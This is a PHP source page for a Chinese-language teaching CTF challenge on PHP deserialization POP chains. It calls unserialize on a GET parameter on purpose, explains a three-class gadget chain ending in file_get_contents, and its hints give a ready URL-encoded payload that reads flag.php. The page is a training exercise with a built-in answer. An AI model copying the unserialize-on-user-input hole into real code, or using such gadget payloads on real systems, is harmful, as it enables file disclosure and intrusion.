<?php
// ============================================================
// unser2 · PHP POP 链（反序列化第二课）
// 漏洞点：unserialize($_GET['obj']) —— 三个类各有一段"看似无害"
//         的魔术方法，但串起来就是一条 POP 利用链
// 考点：  链式触发 __destruct → __toString → __call → sink
// ============================================================
require __DIR__ . '/classes.php';

$msg = '';
if (isset($_GET['obj']) && $_GET['obj'] !== '') {
    try {
        unserialize($_GET['obj']);
    } catch (Throwable $e) {
        $msg = '⚠️ 反序列化异常：' . htmlspecialchars($e->getMessage(), ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    }
}
function e($s) { return htmlspecialchars((string)$s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>unser2 · POP 链 | CTF 教学靶场</title>
<style>
:root{--bg:#0f172a;--card:#1e293b;--ink:#e2e8f0;--dim:#94a3b8;--acc:#38bdf8;--ok:#4ade80;--warn:#fbbf24;--bad:#f87171}
*{box-sizing:border-box}body{margin:0;font-family:"Segoe UI",system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--ink);line-height:1.75}
.wrap{max-width:920px;margin:0 auto;padding:24px 16px 60px}
.badge{display:inline-block;background:#0ea5e9;color:#04121f;font-weight:700;font-size:12px;padding:2px 10px;border-radius:999px;letter-spacing:1px}
h1{font-size:26px;margin:10px 0 4px}.meta{color:var(--dim);font-size:13px;margin-bottom:6px}
.card{background:var(--card);border:1px solid #334155;border-radius:12px;padding:18px 20px;margin:16px 0}
.card h2{margin:0 0 10px;font-size:17px;color:var(--acc);border-left:3px solid var(--acc);padding-left:8px}
pre,code{font-family:Consolas,Menlo,"Courier New",monospace}
pre{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:12px;overflow:auto;font-size:13px}
code{background:#0b1220;border-radius:4px;padding:1px 6px;font-size:13px}
input[type=text]{width:95%;padding:8px 10px;border-radius:8px;border:1px solid #475569;background:#0b1220;color:var(--ink);font-family:Consolas,Menlo,monospace;font-size:12px}
button{padding:8px 18px;border-radius:8px;border:0;background:var(--acc);color:#04121f;font-weight:700;cursor:pointer}
button:hover{filter:brightness(1.15)}
.result{background:#0b1220;border:1px solid #27364d;border-radius:8px;margin-top:12px}
.result .t{padding:6px 12px;border-bottom:1px solid #27364d;color:var(--dim);font-size:12px}
.result pre{border:0;margin:0}
details{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:10px 14px;margin:8px 0}
summary{cursor:pointer;color:var(--warn);font-weight:600}
table{border-collapse:collapse;width:100%;font-size:14px}td,th{border:1px solid #334155;padding:6px 10px;text-align:left}th{color:var(--acc)}
.nav{display:flex;justify-content:space-between;margin-top:22px}.nav a{color:var(--acc);text-decoration:none}
footer{color:var(--dim);font-size:12px;text-align:center;margin-top:30px}
.flagrow{display:flex;gap:8px;flex-wrap:wrap}#flagResult{margin-top:8px;font-size:14px;color:var(--warn);word-break:break-all}
</style>
</head>
<body>
<div class="wrap">
<header>
<span class="badge">反序列化 · 第 2 关</span>
<h1>门禁日志系统 —— PHP POP 链</h1>
<div class="meta">难度：★★★☆☆ 中等 · 关卡 ID：<code>unser2</code> · 运行时：PHP 8</div>
</header>

<section class="card">
<h2>题目描述</h2>
<p>写字楼的门禁系统里有三个类（源码全给出）：门禁日志 <code>DoorLog</code>、工牌 <code>Badge</code>、模板引擎 <code>Engine</code>。每个类的魔术方法单看都"没什么危险"，但 <code>unserialize($_GET['obj'])</code> 允许你把它们<b>串成一条链</b>。</p>
<p>目标：读出本目录 <code>flag.php</code> 的源码（flag 在 PHP 注释里）。入口：<code>/?obj=&lt;序列化串&gt;</code>。</p>
</section>

<section class="card">
<h2>实验区</h2>
<form method="get" action="">
<label>门禁数据（序列化串）：</label>
<input type="text" name="obj" placeholder='O:7:"DoorLog":1:{...}' value="<?= e($_GET['obj'] ?? '') ?>">
<div style="margin-top:8px"><button type="submit">注入系统</button></div>
</form>
<?php if ($msg !== ''): ?>
<div class="result"><div class="t">系统输出</div><pre><?= $msg ?></pre></div>
<?php endif; ?>
<p style="color:var(--dim);font-size:13px">热身：先注入一个普通的 DoorLog 试试 <code>O:7:"DoorLog":1:{s:4:"name";s:5:"alice";}</code>，看看析构日志长什么样。</p>
</section>

<section class="card">
<h2>知识点讲解</h2>
<p><b>POP（Property-Oriented Programming）</b>：面向属性编程。反序列化时攻击者控制每个对象的每个属性，于是"看似无害"的魔术方法可以被<b>精心构造的属性值串起来</b>，像多米诺一样从入口触发到 sink。这是 PHP 反序列化的核心玩法（Java 里对应 Commons-Collections 等 gadget 链）。</p>
<p>本题三个类（完整源码见 <code>classes.php</code>，页面同步展示）：</p>
<pre>class DoorLog {                                   // 入口：脚本结束时析构
    public $name = '访客';
    public function __destruct() {
        echo '[日志] 门禁关闭，最后通行者：' . <b>$this-&gt;name</b> . "\n";   // ← 字符串拼接！
    }
}
class Badge {                                     // 中转：被当字符串使用时
    public $template;
    public function __toString() {
        return (string)<b>$this-&gt;template-&gt;render()</b>;              // ← 调用不存在的方法！
    }
}
class Engine {                                    // 终点：白名单"可控"
    public $allow = []; public $cmd = '';
    public function __call($name, $args) {
        if (isset($this-&gt;allow[$name])) {
            return <b>file_get_contents($this-&gt;cmd)</b>;                // ← sink
        }
    }
}</pre>
<p><b>链路推理</b>（从 sink 倒着找入口是标准姿势）：</p>
<table>
<tr><th>#</th><th>触发点</th><th>需要的属性</th></tr>
<tr><td>1</td><td><code>DoorLog::__destruct</code> 里 <code>'...' . $this-&gt;name</code> 把 name 当<b>字符串</b>拼 → 触发 <code>__toString</code></td><td><code>name</code> = Badge 对象</td></tr>
<tr><td>2</td><td><code>Badge::__toString</code> 调 <code>$this-&gt;template-&gt;render()</code>，Engine 没有 render 方法 → 触发 <code>__call('render')</code></td><td><code>template</code> = Engine 对象</td></tr>
<tr><td>3</td><td><code>Engine::__call</code> 检查 <code>allow['render']</code> 存在 → 执行 <code>file_get_contents($cmd)</code></td><td><code>allow = ['render'=&gt;1]</code>，<code>cmd = 'flag.php'</code></td></tr>
</table>
<p>常用<b>魔术方法触发条件</b>速查（做题必备）：</p>
<table>
<tr><th>魔术方法</th><th>触发条件</th></tr>
<tr><td><code>__destruct / __wakeup</code></td><td>对象销毁 / 反序列化还原（unser1 已学）</td></tr>
<tr><td><code>__toString</code></td><td>对象被当字符串：echo、字符串拼接、<code>strlen()</code> 参数…</td></tr>
<tr><td><code>__call</code></td><td>调用<b>不存在或不可访问</b>的方法</td></tr>
<tr><td><code>__get / __set</code></td><td>读写不存在或不可访问的属性</td></tr>
<tr><td><code>__invoke</code></td><td>对象被当函数调用：<code>$obj()</code></td></tr>
</table>
</section>

<section class="card">
<h2>渐进提示（点开一条想一条，别一口气全看）</h2>
<details><summary>提示 1：从 sink 倒推</summary><p>能读文件的是 <code>Engine::__call</code>，但它需要 <code>allow</code> 里有被调用的方法名。谁会调用 Engine 上不存在的方法？看 <code>Badge::__toString</code> 里的 <code>render()</code>。而 <code>__toString</code> 又是谁触发的？看 <code>DoorLog::__destruct</code> 里的字符串拼接。</p></details>
<details><summary>提示 2：构造三个对象并连起来</summary><p>Engine：<code>allow=['render'=&gt;1]，cmd='flag.php'</code>；Badge：<code>template=Engine</code>；DoorLog：<code>name=Badge</code>。手写序列化串容易长度出错（上一关的教训），用 PHP 帮你生成最稳：<pre>php gen_payload.php</pre>（题目目录已附）会输出 urlencode 好的 payload。</p></details>
<details><summary>提示 3：直出 payload</summary><p><code>/?obj=O%3A7%3A%22DoorLog%22%3A1%3A%7Bs%3A4%3A%22name%22%3BO%3A5%3A%22Badge%22%3A1%3A%7Bs%3A8%3A%22template%22%3BO%3A6%3A%22Engine%22%3A2%3A%7Bs%3A5%3A%22allow%22%3Ba%3A1%3A%7Bs%3A6%3A%22render%22%3Bi%3A1%3B%7Ds%3A3%3A%22cmd%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7D</code>（即 DoorLog{name:Badge{template:Engine{allow:{render:1}, cmd:"flag.php"}}}）</p></details>
</section>

<section class="card">
<h2>提交 Flag</h2>
<form id="flagForm" class="flagrow" onsubmit="return false">
<input type="text" id="flagInput" placeholder="flag{...}" style="flex:1">
<button onclick="submitFlag()">提交</button>
</form>
<div id="flagResult"></div>
</section>

<nav class="nav"><a href="/unser1">← 上一关：unser1 · wakeup 绕过</a><a href="/unser3">下一关：unser3 · Python pickle →</a></nav>
<footer>CTF Web 教学式靶场 · C 组 · 仅用于安全学习</footer>
</div>
<script>
function submitFlag(){
  var v=document.getElementById('flagInput').value.trim();
  var el=document.getElementById('flagResult');
  if(!v){el.textContent='请输入 flag';return}
  el.textContent='提交中...';
  fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'challenge_id=unser2&flag='+encodeURIComponent(v)})
   .then(function(r){return r.text().then(function(t){
      var msg='HTTP '+r.status+': '+t;
      try{var j=JSON.parse(t);
        if(typeof j.correct==='boolean')msg=j.correct?'✅ 回答正确！':'❌ flag 不对，再试试';
        else if(j.message!==undefined)msg=j.message;
      }catch(e){}
      el.textContent=msg;})})
   .catch(function(e){el.textContent='提交失败('+e.message+')：请从靶场门户页提交'});
}
</script>
</body>
</html>
